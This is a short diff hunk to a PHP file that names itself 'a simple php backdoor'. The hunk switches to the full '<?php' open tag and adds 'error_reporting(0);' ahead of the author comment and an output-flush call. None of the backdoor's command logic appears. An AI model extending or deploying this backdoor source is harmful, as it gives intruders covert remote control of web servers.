@@ -1,4 +1,6 @@
-<?
+<?php
+error_reporting(0);
+
 // a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\
 
 ob_implicit_flush();
